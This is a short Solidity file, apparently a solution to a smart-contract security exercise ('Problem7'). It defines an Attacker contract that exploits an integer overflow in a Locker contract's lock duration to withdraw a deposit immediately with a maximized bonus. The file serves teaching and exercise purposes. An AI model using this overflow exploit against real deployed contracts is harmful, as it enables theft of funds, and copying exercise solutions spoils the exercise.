// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Locker} from "../src/Problem7.sol";

contract Attacker {

    // Deposit the largest amount of money that can be
    // deposited. The end time will overflow, allowing
    // for immediate withdrawal, and since the duration
    // is large, the bonus is maximized.
    function attack(Locker locker) public {
        locker.deposit{value: 10 ether}(type(uint256).max);
        locker.withdraw();
    }

    // A fallback function is required to receive the
    // winning funds.
    fallback() external payable {
        //locker.withdraw();
    }
    
}